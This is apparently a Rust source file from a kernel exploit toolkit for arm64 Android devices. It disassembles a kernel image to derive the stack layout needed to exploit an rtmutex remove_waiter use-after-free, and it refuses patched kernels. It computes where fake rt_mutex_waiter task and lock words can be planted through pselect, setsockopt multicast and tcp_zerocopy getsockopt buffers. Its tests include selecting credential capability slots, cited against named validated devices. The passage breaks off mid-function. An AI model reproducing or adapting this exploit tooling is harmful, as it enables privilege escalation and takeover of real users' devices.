//! Disassembly-driven derivation: pselect/futex waiter layout and the
//! nf_logger slide slot. Direct ports of the Python analysis.

use std::collections::{BTreeMap, BTreeSet};

use regex::Regex;

use crate::btf::Btf;
use crate::disasm::{
    add_sp_immediates, cmp_immediates, disassemble_range, first_sp_frame, has_direct_call,
    is_mov_w0_wzr, is_mov_x1, materialized_address, validate_frame_live_at,
};
use crate::error::{ExtractError, Result};
use crate::kallsyms::unique_or_err;

pub const PSELECT_ROUTE_NFDS: u64 = 320;
pub const OBJDUMP_CAP: usize = 0x2000;

pub type RelSymbols = BTreeMap<String, BTreeSet<u64>>;

/// Rebase kallsyms onto _text and return a sorted list of all offsets.
pub fn relative_symbols(
    symbols: &BTreeMap<String, BTreeSet<u64>>,
    base: u64,
) -> (RelSymbols, Vec<u64>) {
    let mut relative: RelSymbols = BTreeMap::new();
    let mut all_offsets: BTreeSet<u64> = BTreeSet::new();
    for (name, values) in symbols {
        let offsets: BTreeSet<u64> = values
            .iter()
            .filter(|value| **value >= base)
            .map(|value| *value - base)
            .collect();
        if !offsets.is_empty() {
            relative.insert(name.clone(), offsets.clone());
            all_offsets.extend(offsets);
        }
    }
    let sorted: Vec<u64> = all_offsets.into_iter().collect();
    (relative, sorted)
}

pub fn unique_offset(symbols: &RelSymbols, name: &str) -> Result<u64> {
    unique_or_err(symbols, name)
}

pub fn unique_offset_optional(symbols: &RelSymbols, name: &str) -> Option<u64> {
    unique_offset(symbols, name).ok()
}

pub(crate) fn disassemble_symbol(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
    name: &str,
    cap: usize,
) -> Result<Vec<String>> {
    let start = unique_offset(symbols, name)? as usize;
    let higher = sorted_offsets.iter().find(|off| **off as usize > start);
    let stop = (start + cap).min(higher.map_or(start + cap, |off| *off as usize));
    disassemble_range(kernel, start, stop)
}

/// reject kernels that include the rtmutex
/// remove_waiter() fix before offset extraction.
pub fn ensure_rtmutex_43499_unpatched(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
) -> Result<u64> {
    let start = unique_offset_optional(symbols, "remove_waiter")
        .ok_or_else(|| ExtractError::new("cannot check: remove_waiter is not in kallsyms"))?;
    let cap = OBJDUMP_CAP as u64;
    let stop = (start + cap).min(
        sorted_offsets
            .iter()
            .find(|off| **off > start)
            .map_or(start + cap, |off| *off),
    );
    let dis = disassemble_range(kernel, start as usize, stop as usize)?;
    if remove_waiter_uses_current(&dis) {
        return Ok(start);
    }
    Err(ExtractError::already_fixed(format!(
        "remove_waiter()@{start:#x} never reads current (no mrs sp_el0); \
         rtmutex UAF fix is present"
    )))
}

/// True when `remove_waiter()` still operates on `current` (vulnerable):
/// the fixed variant no longer contains `mrs xN, sp_el0`.
pub fn remove_waiter_uses_current(dis: &[String]) -> bool {
    let mrs_current = Regex::new(r"(?i)\bmrs\s+x\d+,\s*s3_0_c4_c1_0\b").unwrap();
    dis.iter().any(|line| mrs_current.is_match(line))
}

/// Some Android kernels inline `tcp_zerocopy_receive()` into the TCP option
/// handler, so its symbol disappears while the `TCP_ZEROCOPY_RECEIVE` path
/// stays. `tcp_zerocopy_vm_insert_batch` is only reachable from
/// `tcp_zerocopy_receive`, so a direct call to it from the option handler
/// proves the inlined path is present.
pub fn tcp_zerocopy_receive_inlined(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
) -> bool {
    let Some(batch) = unique_offset_optional(symbols, "tcp_zerocopy_vm_insert_batch") else {
        return false;
    };
    for handler in ["do_tcp_getsockopt", "do_tcp_setsockopt"] {
        let Ok(dis) = disassemble_symbol(kernel, symbols, sorted_offsets, handler, OBJDUMP_CAP)
        else {
            continue;
        };
        if has_direct_call(&dis, batch) {
            return true;
        }
    }
    false
}

/// The tcp_zerocopy delivery geometry: the fake `waiter->task`/`waiter->lock`
/// words are stamped through the `getsockopt` local the kernel copies from the
/// user buffer. Buffer words 0x28/0x30 land on `waiter+0x30`/`waiter+0x38`
/// only while that local sits exactly 8 bytes above the futex waiter, and the
/// copy cap must reach the last fake word (0x38).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct TcpZerocopyLayout {
    pub copy_cap: u64,
    pub zc_local: u64,
    pub chain_sum: u64,
    pub zc_depth: i64,
    pub waiter_depth: i64,
    pub delta: i64,
}

/// The TCP `getsockopt` chain: syscall entry, socket layer, proto-ops wrapper,
/// protocol handler and option dispatcher. The two middle links are indirect
/// (`sock->ops->getsockopt`, `sk_prot->getsockopt`), so the chain is named
/// rather than walked; the direct links are validated in the derivation.
const GETSOCKOPT_CHAIN: &[&str] = &[
    "__arm64_sys_getsockopt",
    "__sys_getsockopt",
    "sock_common_getsockopt",
    "tcp_getsockopt",
    "do_tcp_getsockopt",
];

/// The fake waiter's last buffer word ends at 0x30 + 8; a copy cap below this
/// cannot carry the whole stamp.
pub const TCP_FAKE_WAITER_END: u64 = 0x38;

/// `&zc` at the `tcp_zerocopy_receive` call site: the second argument is the
/// copied user struct, addressed as `sp + local` (or plain `sp`).
fn zc_local_before_call(lines: &[String], target: u64) -> Option<u64> {
    let call = Regex::new(&format!(r"(?i)\bbl\s+0x{target:x}\b")).ok()?;
    let add = Regex::new(r"(?i)\badd\s+x1,\s*sp,\s*#0x([0-9a-f]+)").unwrap();
    let mov = Regex::new(r"(?i)\bmov\s+x1,\s*sp\b").unwrap();
    for (index, line) in lines.iter().enumerate() {
        if !call.is_match(line) {
            continue;
        }
        for previous in lines[..index].iter().rev().take(8) {
            if let Some(captures) = add.captures(previous) {
                return u64::from_str_radix(&captures[1], 16).ok();
            }
            if mov.is_match(previous) {
                return Some(0);
            }
        }
    }
    None
}

/// `sizeof(struct tcp_zerocopy_receive)` from the length checks the compiler
/// emits in `do_tcp_getsockopt`: `cmp wN, #0xc` (`offsetofend(length)`),
/// followed by `cmp wN, #cap+1`. The two checks are adjacent on some builds;
/// newer compilers interleave other work, so the fallback accepts a single
/// plausible struct-size comparison anywhere in a function that carries the
/// 0xc bound. Returns every candidate cap; the caller requires exactly one.
fn copy_cap_from_dis(lines: &[String]) -> Vec<u64> {
    let cmp = Regex::new(r"(?i)\bcmp\s+w(\d+),\s*#0x([0-9a-f]+)\b").unwrap();
    let mut caps = Vec::new();
    for (index, line) in lines.iter().enumerate() {
        let Some(first) = cmp.captures(line) else {
            continue;
        };
        if first.get(2).map(|value| value.as_str()) != Some("c") {
            continue;
        }
        let register = first.get(1).unwrap().as_str().to_string();
        let end = (index + 5).min(lines.len());
        for next in &lines[index + 1..end] {
            let Some(second) = cmp.captures(next) else {
                continue;
            };
            if second.get(1).map(|value| value.as_str()) != Some(register.as_str()) {
                continue;
            }
            let Some(limit) =
                u64::from_str_radix(second.get(2).unwrap().as_str(), 16).ok()
            else {
                continue;
            };
            if (0x11..=0x101).contains(&limit) {
                caps.push(limit - 1);
            }
        }
    }
    caps.sort_unstable();
    caps.dedup();
    if !caps.is_empty() {
        return caps;
    }
    // Fallback for the split-check shape (6.12.x): the cap comparison is no
    // longer next to the 0xc bound. Only accept struct sizes that occur in
    // practice, and only in a function that has the bound.
    let has_bound = lines.iter().any(|line| {
        cmp.captures(line)
            .is_some_and(|c| c.get(2).map(|v| v.as_str()) == Some("c"))
    });
    if !has_bound {
        return caps;
    }
    for line in lines {
        let Some(captures) = cmp.captures(line) else {
            continue;
        };
        let Some(limit) = u64::from_str_radix(captures.get(2).unwrap().as_str(), 16).ok() else {
            continue;
        };
        if PLAUSIBLE_TCP_CAPS.contains(&(limit.saturating_sub(1))) {
            caps.push(limit - 1);
        }
    }
    caps.sort_unstable();
    caps.dedup();
    caps
}

/// Struct sizes the fallback accepts; the real `tcp_zerocopy_receive` sizes
/// are 0x18 (5.10.81), 0x28 (5.10.236) and 0x40 (6.1+), with headroom for a
/// future field addition.
const PLAUSIBLE_TCP_CAPS: &[u64] = &[0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x48, 0x50, 0x58, 0x60];

/// Derive the tcp_zerocopy delivery relation from the image. `waiter_depth`
/// comes from the pselect/futex derivation (the same negative depth space).
pub fn derive_tcp_zerocopy_layout(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
    waiter_depth: i64,
) -> Result<TcpZerocopyLayout> {
    let receive = unique_offset(symbols, "tcp_zerocopy_receive").map_err(|_| {
        ExtractError::new(
            "tcp_zerocopy_receive is absent from kallsyms (inlined or missing); \
             the zc local is not derivable",
        )
    })?;
    let dis = disassemble_symbol(
        kernel,
        symbols,
        sorted_offsets,
        "do_tcp_getsockopt",
        OBJDUMP_CAP,
    )?;
    let zc_local = zc_local_before_call(&dis, receive).ok_or_else(|| {
        ExtractError::new(
            "do_tcp_getsockopt: no tcp_zerocopy_receive call with a stack zc local",
        )
    })?;
    let mut caps = copy_cap_from_dis(&dis);
    caps.sort_unstable();
    caps.dedup();
    let copy_cap = match caps.as_slice() {
        [cap] => *cap,
        other => {
            return Err(ExtractError::new(format!(
                "do_tcp_getsockopt: tcp copy cap candidates not unique: {other:x?}"
            )))
        }
    };
    for (caller, callee) in [
        ("__arm64_sys_getsockopt", "__sys_getsockopt"),
        ("tcp_getsockopt", "do_tcp_getsockopt"),
    ] {
        let caller_dis = disassemble_symbol(kernel, symbols, sorted_offsets, caller, OBJDUMP_CAP)?;
        let target = unique_offset(symbols, callee)?;
        if !has_direct_call(&caller_dis, target) {
            return Err(ExtractError::new(format!(
                "{caller} does not directly call {callee}"
            )));
        }
    }
    let chain_sum = sum_chain_frames(kernel, symbols, sorted_offsets, GETSOCKOPT_CHAIN)?;
    let zc_depth = -(chain_sum as i64) + zc_local as i64;
    let delta = zc_depth - (waiter_depth + 8);
    Ok(TcpZerocopyLayout {
        copy_cap,
        zc_local,
        chain_sum,
        zc_depth,
        waiter_depth,
        delta,
    })
}

/// One-shot multicast stack geometry derived from the target kernel image
/// (no device, no root). Depths are measured from the syscall stack top.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct McastWaiterGeometry {    pub waiter_off: u64,
    pub setsockopt_depth: u64,
    pub waiter_depth: u64,
}

const SETSOCKOPT_CHAIN: &[&str] = &[
    "__arm64_sys_setsockopt",
    "__sys_setsockopt",
    "sock_common_setsockopt",
    "udp_setsockopt",
    "ip_setsockopt",
];
const FUTEX_CHAIN: &[&str] = &["__arm64_sys_futex", "do_futex", "futex_wait_requeue_pi"];

fn sum_chain_frames(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted: &[u64],
    names: &[&str],
) -> Result<u64> {
    let mut total = 0u64;
    for name in names {
        let dis = disassemble_symbol(kernel, symbols, sorted, name, OBJDUMP_CAP)?;
        total = total
            .checked_add(first_sp_frame(&dis, name)?)
            .ok_or_else(|| ExtractError::new("multicast frame depth overflow"))?;
    }
    Ok(total)
}

/// The `add xN, sp, #off` feeding the `mov w2, #buffer_size` copy in
/// `ip_setsockopt`: the multicast stamp window offset.
fn greqs_offset_from_dis(lines: &[String], buffer_size: u64) -> Option<u64> {
    let mov = Regex::new(&format!(r"(?i)\bmov\s+w2,\s*#0x{buffer_size:x}\b")).unwrap();
    let add = Regex::new(r"(?i)\badd\s+x\d+,\s*sp,\s*#0x([0-9a-f]+)").unwrap();
    for (i, line) in lines.iter().enumerate() {
        if !mov.is_match(line) {
            continue;
        }
        let lo = i.saturating_sub(8);
        for prev in lines[lo..i].iter().rev() {
            if let Some(caps) = add.captures(prev) {
                return u64::from_str_radix(&caps[1], 16).ok();
            }
        }
    }
    None
}

/// The `add x27, sp, #off` waiter local in `futex_wait_requeue_pi`, proven by
/// the `add xN, x27, #<pi_tree_entry>` that indexes it.
fn waiter_local_from_dis(lines: &[String], pi_tree_entry: u64) -> Option<u64> {
    let set = Regex::new(r"(?i)\badd\s+x27,\s*sp,\s*#0x([0-9a-f]+)").unwrap();
    let idx = Regex::new(&format!(
        r"(?i)\badd\s+x\d+,\s*x27,\s*#0x{pi_tree_entry:x}\b"
    ))
    .unwrap();
    for (i, line) in lines.iter().enumerate() {
        if let Some(caps) = set.captures(line) {
            let hi = (i + 8).min(lines.len());
            if lines[i + 1..hi].iter().any(|l| idx.is_match(l)) {
                return u64::from_str_radix(&caps[1], 16).ok();
            }
        }
    }
    None
}

/// Static one-shot multicast `waiter_off` for the target image:
/// `(Σ setsockopt_frames − greqs_off) − (Σ futex_frames − waiter_local_off)`,
/// then the copy-window rule the app's validator applies:
/// `waiter_off + lock_offset + 8 <= buffer_size`. A short window is an
/// `Infeasible` verdict, not a candidate: `multicast_waiter_off()` returning a
/// number is not by itself a proof that the copy reaches the waiter.
/// Validated to reproduce the A301SO hardware value (`0x60`).
pub fn multicast_waiter_off(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted: &[u64],
    buffer_size: u64,
    pi_tree_entry: u64,
    lock_offset: u64,
) -> Result<McastWaiterGeometry> {
    let setsockopt_frames = sum_chain_frames(kernel, symbols, sorted, SETSOCKOPT_CHAIN)?;
    let futex_frames = sum_chain_frames(kernel, symbols, sorted, FUTEX_CHAIN)?;
    let ip = disassemble_symbol(kernel, symbols, sorted, "ip_setsockopt", OBJDUMP_CAP)?;
    let greqs = greqs_offset_from_dis(&ip, buffer_size)
        .ok_or_else(|| ExtractError::new("ip_setsockopt multicast copy window not found"))?;
    let fw = disassemble_symbol(
        kernel,
        symbols,
        sorted,
        "futex_wait_requeue_pi",
        OBJDUMP_CAP,
    )?;
    let waiter_local = waiter_local_from_dis(&fw, pi_tree_entry)
        .ok_or_else(|| ExtractError::new("futex_wait_requeue_pi waiter local not found"))?;
    let numbers = |waiter_off: i64, setsockopt_depth: u64, waiter_depth: u64| {
        [
            ("waiter_off", waiter_off),
            ("setsockopt_depth", setsockopt_depth as i64),
            ("waiter_depth", waiter_depth as i64),
            ("buffer_size", buffer_size as i64),
            ("lock_offset", lock_offset as i64),
        ]
        .into_iter()
        .map(|(key, value)| (key.to_string(), value))
        .collect::<BTreeMap<String, i64>>()
    };
    let setsockopt_depth = setsockopt_frames.checked_sub(greqs).ok_or_else(|| {
        ExtractError::infeasible_with(
            "greqs offset exceeds setsockopt frames",
            numbers(0, setsockopt_frames, futex_frames.saturating_sub(waiter_local)),
        )
    })?;
    let waiter_depth = futex_frames.checked_sub(waiter_local).ok_or_else(|| {
        ExtractError::infeasible_with(
            "waiter local exceeds futex frames",
            numbers(
                setsockopt_depth as i64,
                setsockopt_depth,
                futex_frames.saturating_sub(waiter_local),
            ),
        )
    })?;
    let waiter_off = setsockopt_depth
        .checked_sub(waiter_depth)
        .ok_or_else(|| {
            ExtractError::infeasible_with(
                "no multicast overlap in stack geometry",
                numbers(0, setsockopt_depth, waiter_depth),
            )
        })?;
    if waiter_off == 0 {
        return Err(ExtractError::infeasible_with(
            "multicast waiter_off is zero; the app requires a positive offset",
            numbers(0, setsockopt_depth, waiter_depth),
        ));
    }
    let window_end = waiter_off
        .checked_add(lock_offset)
        .and_then(|value| value.checked_add(8))
        .ok_or_else(|| {
            ExtractError::infeasible_with(
                "multicast copy window overflows",
                numbers(waiter_off as i64, setsockopt_depth, waiter_depth),
            )
        })?;
    if window_end > buffer_size {
        let mut values = numbers(waiter_off as i64, setsockopt_depth, waiter_depth);
        values.insert("window_end".to_string(), window_end as i64);
        // The diting profiles state the shortfall from the waiter start
        // (0x48 on 5.10.236, 0x98 on 5.10.81); the rule's lock-slot shortfall
        // adds task/lock + 8 bytes to it.
        let waiter_short = waiter_off.saturating_sub(buffer_size);
        let lock_short = window_end - buffer_size;
        let detail = if waiter_short > 0 {
            format!(
                "copy window ends {waiter_short:#x} bytes short of the waiter start \
                 ({lock_short:#x} short of the lock slot)"
            )
        } else {
            format!(
                "waiter starts inside the copy window but the lock slot ends \
                 {lock_short:#x} bytes beyond it"
            )
        };
        return Err(ExtractError::infeasible_with(
            format!(
                "multicast {detail}: waiter_off={waiter_off:#x} \
                 lock_offset={lock_offset:#x} buffer_size={buffer_size:#x} \
                 window_end={window_end:#x}"
            ),
            values,
        ));
    }
    Ok(McastWaiterGeometry {
        waiter_off,
        setsockopt_depth,
        waiter_depth,
    })
}

#[cfg(test)]
mod tests {
    use super::{
        fpsimd_copy_destination, multicast_geometry_5x, multicast_geometry_btf_only,
        pselect_shift_from_delta, remove_waiter_uses_current, select_cred_caps, select_cred_refs,
        sigreturn_offset,
    };
    use std::collections::BTreeMap;

    #[test]
    fn cred_caps_selects_the_contiguous_non_zero_run() {
        let slots: &[(u32, u64)] = &[
            (0x28, 0),
            (0x30, 0x1ffffffffff),
            (0x38, 0x1ffffffffff),
            (0x40, 0x1ffffffffff),
            (0x48, 0),
        ];
        let read = |offset: u32| slots.iter().find(|(o, _)| *o == offset).map(|(_, v)| *v);
        assert_eq!(
            select_cred_caps(read, 0x28, 0x50),
            Some((0x30, 3, 0x1ffffffffff))
        );
    }

    #[test]
    fn cred_caps_rejects_an_all_zero_range() {
        assert_eq!(select_cred_caps(|_| Some(0u64), 0x28, 0x50), None);
    }

    #[test]
    fn cred_refs_keep_only_non_zero_kernel_vas_in_offset_order() {
        let slots = [
            (0x78, 0),
            (0x80, 0xffffffc00ab23a80),
            (0x88, 0x0000000000000004),
            (0x58, 0),
            (0x98, 0xffffffc00ab23b28),
            (0x90, 0xffffffc00ab23ff0),
        ];
        assert_eq!(
            select_cred_refs(&slots),
            vec![
                (0x80, 0xffffffc00ab23a80),
                (0x90, 0xffffffc00ab23ff0),
                (0x98, 0xffffffc00ab23b28),
            ]
        );
    }

    #[test]
    fn multicast_geometry_uses_btf_offsets_and_the_proven_constants() {
        let mut structs: BTreeMap<String, Option<u32>> = BTreeMap::new();
        structs.insert("waiter_task".to_string(), Some(48));
        structs.insert("waiter_lock".to_string(), Some(56));
        let geometry = multicast_geometry_5x(&structs);
        assert_eq!(geometry.first(), Some(&("waiter_off", 96)));
        assert!(geometry.contains(&("task_offset", 48)));
        assert!(geometry.contains(&("lock_offset", 56)));
        assert!(
            !geometry
                .iter()
                .any(|(key, _)| key.starts_with("fake_") || key.starts_with("lock_slot"))
        );
        assert!(geometry.contains(&("compact_waiter", 1)));

        let without: BTreeMap<String, Option<u32>> = BTreeMap::new();
        let geometry = multicast_geometry_5x(&without);
        // No BTF: the 5.10 codegen layout fills task/lock.
        assert!(geometry.contains(&("task_offset", 0x30)));
        assert!(geometry.contains(&("lock_offset", 0x38)));
    }

    #[test]
    fn pselect_delta_classifies_geometry_and_the_waiter_band() {
        assert_eq!(pselect_shift_from_delta(0), Ok(0));
        assert_eq!(pselect_shift_from_delta(8), Ok(1));
        assert_eq!(pselect_shift_from_delta(24), Ok(3));
        assert_eq!(pselect_shift_from_delta(32), Ok(4));
        assert!(pselect_shift_from_delta(-8).is_err());
        assert!(pselect_shift_from_delta(4).is_err());
        assert!(pselect_shift_from_delta(40).is_err());
    }

    #[test]
    fn sigreturn_offsets_fit_the_copy_window() {
        assert_eq!(sigreturn_offset(0x140).unwrap(), 0x140);
        assert_eq!(sigreturn_offset(0x150).unwrap(), 0x150);
        assert_eq!(sigreturn_offset(0xf0).unwrap(), 0xf0);
        assert_eq!(sigreturn_offset(0x100).unwrap(), 0x100);
        assert!(sigreturn_offset(-0x30).is_err());
        assert!(sigreturn_offset(0).is_err());
        assert!(sigreturn_offset(4).is_err());
        assert!(sigreturn_offset(0x1b0).is_err());
    }

    #[test]
    fn fpsimd_copy_destination_reads_plain_and_sve_helpers() {
        let plain: Vec<String> = vec![
            "0334: mov x0, sp".to_string(),
            "0338: mov w2, #0x200".to_string(),
            "033c: bl 0x1ecc0".to_string(),
        ];
        assert_eq!(fpsimd_copy_destination(&plain, 0x200).unwrap(), 0);
        let sve: Vec<String> = vec![
            "01d4: add x0, sp, #0x10".to_string(),
            "01d8: mov w2, #0x200".to_string(),
            "01dc: bl 0x1ecc0".to_string(),
        ];
        assert_eq!(fpsimd_copy_destination(&sve, 0x200).unwrap(), 0x10);
    }

    #[test]
    fn unverified_multicast_geometry_keeps_only_btf_offsets() {
        let mut structs: BTreeMap<String, Option<u32>> = BTreeMap::new();
        structs.insert("waiter_task".to_string(), Some(48));
        structs.insert("waiter_lock".to_string(), Some(56));
        assert_eq!(
            multicast_geometry_btf_only(&structs),
            vec![("task_offset", 48), ("lock_offset", 56)]
        );
        let without: BTreeMap<String, Option<u32>> = BTreeMap::new();
        assert!(multicast_geometry_btf_only(&without).is_empty());
    }

    #[test]
    fn patched_remove_waiter_never_reads_current() {
        let dis = vec![
            "0106f91c: ldr x20, [x23, #0x50]".to_string(),
            "0106f964: str xzr, [x20, #0x938]".to_string(),
            "0106fae8: mov x5, x20".to_string(),
        ];
        assert!(!remove_waiter_uses_current(&dis));
    }

    #[test]
    fn vulnerable_remove_waiter_reads_current() {
        let dis = vec![
            "01068de0: mrs x20, s3_0_c4_c1_0".to_string(),
            "01068e2c: mov x0, x21".to_string(),
            "01068e30: str xzr, [x20, #0x938]".to_string(),
        ];
        assert!(remove_waiter_uses_current(&dis));
    }

    #[test]
    fn multicast_stamp_and_waiter_locals_are_read_from_disassembly() {
        let ip: Vec<String> = vec![
            "00f4: add x0, sp, #0x18".to_string(),
            "0100: add x24, sp, #0x18".to_string(),
            "01cc: add x0, sp, #0x18".to_string(),
            "01d4: mov w2, #0x108".to_string(),
        ];
        assert_eq!(super::greqs_offset_from_dis(&ip, 0x108), Some(0x18));

        let fw: Vec<String> = vec![
            "011c: add x27, sp, #0x98".to_string(),
            "0124: add x9, x27, #0x18".to_string(),
        ];
        assert_eq!(super::waiter_local_from_dis(&fw, 0x18), Some(0x98));
    }

    #[test]
    fn multicast_waiter_off_matches_the_validated_images() {
        // Depths from the validated images; the arithmetic must reproduce the
        // hardware-observed one-shot waiter_off.
        let off = |setsockopt_frames: u64, greqs: u64, futex_frames: u64, wlocal: u64| {
            (setsockopt_frames - greqs) - (futex_frames - wlocal)
        };
        // A301SO 5.15.189 (hardware-probed = 0x60).
        assert_eq!(off(0x370, 0x18, 0x390, 0x98), 0x60);
        // PD2361 5.15.178 (static candidate = 0x50).
        assert_eq!(off(0x370, 0x18, 0x330, 0x28), 0x50);
    }

    #[test]
    fn tcp_zc_local_is_the_call_sites_second_argument() {
        // 5.10.236 shape: the copy block and the tcp_zerocopy_receive call.
        let dis: Vec<String> = vec![
            "add x0, sp, #0x28".to_string(),
            "mov x1, x19".to_string(),
            "mov x2, x20".to_string(),
            "bl 0x145c55c".to_string(),
            "cbnz x0, 0x145d6e8".to_string(),
            "mov x0, x21".to_string(),
            "add x1, sp, #0x28".to_string(),
            "mov x0, x21".to_string(),
            "bl 0x145fbb0".to_string(),
        ];
        assert_eq!(super::zc_local_before_call(&dis, 0x145fbb0), Some(0x28));
        assert_eq!(super::zc_local_before_call(&dis, 0xdead), None);
        let plain: Vec<String> = vec![
            "mov x1, sp".to_string(),
            "mov x0, x21".to_string(),
            "bl 0x900".to_string(),
        ];
        assert_eq!(super::zc_local_before_call(&plain, 0x900), Some(0));
    }

    #[test]
    fn tcp_copy_cap_comes_from_the_0xc_limit_pair() {
        // 5.10.236: offsetofend(length)=0xc, cap=0x28 checked as 0x29.
        let dis: Vec<String> = vec![
            "cmp w26, #0xc".to_string(),
            "b.lo 0x145d6ec".to_string(),
            "cmp w26, #0x29".to_string(),
        ];
        assert_eq!(super::copy_cap_from_dis(&dis), vec![0x28]);
        // 6.1: cap=0x40 checked as 0x41; an unrelated w8 comparison later in
        // the function must not create a second candidate.
        let dis61: Vec<String> = vec![
            "cmp w4, #0xc".to_string(),
            "b.lt 0xe4e894".to_string(),
            "cmp w4, #0x41".to_string(),
            "b.hs 0xe4eba0".to_string(),
            "add x0, sp, #0x40".to_string(),
            "cmp w8, #0xc".to_string(),
            "b.hi 0xe4eb84".to_string(),
            "mov w9, #0x1".to_string(),
            "mov w10, #0xae8".to_string(),
            "lsl w9, w9, w8".to_string(),
        ];
        assert_eq!(super::copy_cap_from_dis(&dis61), vec![0x40]);
        let none: Vec<String> = vec!["cmp w1, #0x10".to_string()];
        assert!(super::copy_cap_from_dis(&none).is_empty());
    }

    #[test]
    fn tcp_copy_cap_accepts_the_split_check_shape() {
        // 6.12.69: the compiler separates the 0xc bound from the cap
        // comparison; the fallback must still find 0x40 and ignore other
        // register comparisons.
        let dis: Vec<String> = vec![
            "cmp w8, #0xc".to_string(),
            "b.ge 0x31bd60".to_string(),
            "ldr w8, [x23, #0x6f0]".to_string(),
            "b 0x31b91c".to_string(),
            "mov w8, #0x2".to_string(),
            "cmp w8, #0x41".to_string(),
            "b.hs 0x31bf2c".to_string(),
        ];
        assert_eq!(super::copy_cap_from_dis(&dis), vec![0x40]);
    }
}

/// The fields of `struct rt_mutex_waiter` the routes read, and where the
/// layout came from. `wake_state` is absent on 5.10 (it is a 5.15/6.x field).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct WaiterLayout {
    pub pi_tree_entry: u64,
    pub task: Option<u64>,
    pub lock: Option<u64>,
    pub wake_state: Option<u64>,
    pub source: &'static str,
}

impl WaiterLayout {
    /// Read the layout from BTF. `pi_tree_entry` is the only field the pselect
    /// derivation requires; `task`/`lock` stay `None` when BTF omits them.
    pub fn from_btf(btf: &Btf) -> Result<Self> {
        let pi_tree_entry = btf
            .field("rt_mutex_waiter", "pi_tree")
            .or_else(|| btf.field("rt_mutex_waiter", "pi_tree_entry"))
            .ok_or_else(|| {
                ExtractError::new("BTF rt_mutex_waiter.pi_tree/pi_tree_entry missing")
            })?;
        Ok(Self {
            pi_tree_entry: pi_tree_entry as u64,
            task: btf.field("rt_mutex_waiter", "task").map(u64::from),
            lock: btf.field("rt_mutex_waiter", "lock").map(u64::from),
            wake_state: btf.field("rt_mutex_waiter", "wake_state").map(u64::from),
            source: "btf",
        })
    }
}

/// The route's fd_set word table: `PSELECT_ROUTE_NFDS` fd slots over three
/// sets, and the compact waiter strip's last word. The waiter shift is the
/// layout delta in qwords; the last strip word must still land inside the
/// copied table (`(320 + 63) / 64 * 3 = 15` words, strip words 0..10).
pub const MAX_PSELECT_SHIFT: u64 = 4;

/// Classify the pselect/futex overlap in bytes. A negative or misaligned delta
/// is a geometric impossibility, as is a shift beyond the word table; every
/// other derivation failure stays a generic error (Unknown, not Infeasible).
pub fn pselect_shift_from_delta(delta: i64) -> std::result::Result<u64, String> {
    if delta < 0 || delta % 8 != 0 {
        return Err(format!(
            "pselect/futex overlap is not a non-negative qword: delta={delta}"
        ));
    }
    let shift = (delta / 8) as u64;
    if shift > MAX_PSELECT_SHIFT {
        return Err(format!(
            "futex waiter starts {shift} qwords above the fd_set buffer; the route's \
             word table holds 15 words and the waiter strip 11 (max feasible shift is \
             {MAX_PSELECT_SHIFT})"
        ));
    }
    Ok(shift)
}

fn pselect_numbers(
    pselect_word0: i64,
    futex_waiter: i64,
    pselect_buffer: u64,
    waiter_local: u64,
    delta: i64,
) -> BTreeMap<String, i64> {
    [
        ("pselect_word0", pselect_word0),
        ("futex_waiter", futex_waiter),
        ("buffer", pselect_buffer as i64),
        ("waiter_local", waiter_local as i64),
        ("delta", delta),
    ]
    .into_iter()
    .map(|(key, value)| (key.to_string(), value))
    .collect()
}

pub struct PselectLayout {
    pub shift: u64,
    pub waiter_local: u64,
    pub pselect_word0: i64,
    pub futex_waiter: i64,
    pub pselect_buffer: u64,
    pub chain: String,
    pub futex_chain: String,
    pub frames: BTreeMap<String, u64>,
}

pub fn derive_pselect_layout(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
    btf: Option<&Btf>,
    route_nfds: u64,
) -> Result<PselectLayout> {
    let mut names: Vec<(&str, &str)> = vec![
        ("pselect_wrapper", "__arm64_sys_pselect6"),
        ("pselect_core", "core_sys_select"),
        ("futex_wrapper", "__arm64_sys_futex"),
        ("futex_dispatch", "do_futex"),
        ("futex_wait", "futex_wait_requeue_pi"),
    ];
    if unique_offset_optional(symbols, "do_pselect").is_some() {
        names.push(("pselect_dispatch", "do_pselect"));
    }

    let mut dis: BTreeMap<&str, Vec<String>> = BTreeMap::new();
    for (key, name) in &names {
        dis.insert(
            key,
            disassemble_symbol(kernel, symbols, sorted_offsets, name, OBJDUMP_CAP)?,
        );
    }

    let mut pselect_chain = vec!["pselect_wrapper"];
    let pselect_core_addr = unique_offset(symbols, "core_sys_select")?;
    if has_direct_call(&dis["pselect_wrapper"], pselect_core_addr) {
        // inline path
    } else if names.iter().any(|(k, _)| *k == "pselect_dispatch") {
        let dispatch_addr = unique_offset(symbols, "do_pselect")?;
        if !has_direct_call(&dis["pselect_wrapper"], dispatch_addr) {
            return Err(ExtractError::new(
                "__arm64_sys_pselect6 calls neither core_sys_select nor do_pselect",
            ));
        }
        if !has_direct_call(&dis["pselect_dispatch"], pselect_core_addr) {
            return Err(ExtractError::new(
                "do_pselect does not directly call core_sys_select",
            ));
        }
        pselect_chain.push("pselect_dispatch");
    } else {
        return Err(ExtractError::new(
            "__arm64_sys_pselect6 calls neither core_sys_select nor do_pselect",
        ));
    }
    pselect_chain.push("pselect_core");

    let mut futex_chain = vec!["futex_wrapper"];
    let futex_wait_addr = unique_offset(symbols, "futex_wait_requeue_pi")?;
    if has_direct_call(&dis["futex_wrapper"], futex_wait_addr) {
        // direct path
    } else if has_direct_call(&dis["futex_wrapper"], unique_offset(symbols, "do_futex")?) {
        if !has_direct_call(&dis["futex_dispatch"], futex_wait_addr) {
            return Err(ExtractError::new(
                "do_futex does not directly call futex_wait_requeue_pi",
            ));
        }
        futex_chain.push("futex_dispatch");
    } else {
        return Err(ExtractError::new(
            "__arm64_sys_futex calls neither do_futex nor futex_wait_requeue_pi",
        ));
    }
    futex_chain.push("futex_wait");

    for (caller, callee) in pselect_chain.iter().zip(pselect_chain.iter().skip(1)) {
